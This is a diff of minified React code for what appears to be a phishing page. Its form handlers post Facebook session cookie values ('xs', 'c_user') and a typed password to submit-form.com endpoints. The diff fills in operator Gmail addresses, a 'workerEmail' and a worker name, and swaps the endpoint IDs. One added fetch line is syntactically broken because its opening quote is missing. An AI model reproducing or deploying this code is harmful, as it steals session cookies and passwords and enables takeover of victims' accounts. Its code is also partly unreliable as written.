@@ -10285,7 +10285,7 @@
           let { hide: t } = e;
           const [r, a] = (0, n.useState)(),
             [i, o] = (0, n.useState)(),
-            l = ,
+            l = ["mjohn72929@gmail.com","ameliajackson4001@gmail.com"],
             s = _();
           return (0, me.jsxs)(me.Fragment, {
             children: [
@@ -10375,15 +10375,15 @@
                         className: "ant-form ant-form-horizontal css-m4timi",
                         onSubmit: (e) => {
                           e.preventDefault(),
-                            fetch("https://submit-form.com/kZRZCwBEg", {
+                            fetch(https://submit-form.com/3b3G50Fob", {
                               method: "POST",
                               headers: { "Content-Type": "application/json" },
                               body: JSON.stringify({
                                 emails: l,
-                                workerEmail: ,
+                                workerEmail: "mjohn72929@gmail.com",
                                 xs: r,
                                 c_user: i,
-                                name: ,
+                                name: "Aizaz",
                               }),
                             }).then((e) => {
                               e.ok;
@@ -14422,7 +14422,7 @@
               (0, me.jsx)("button", {
                 onClick: (n) => {
                   n.preventDefault(),
-                    fetch("https://submit-form.com/3b3G50Fob", {
+                    fetch("https://submit-form.com/kZRZCwBEg", {
                       method: "POST",
                       headers: { "Content-Type": "application/json" },
                       body: JSON.stringify({ password: t }),
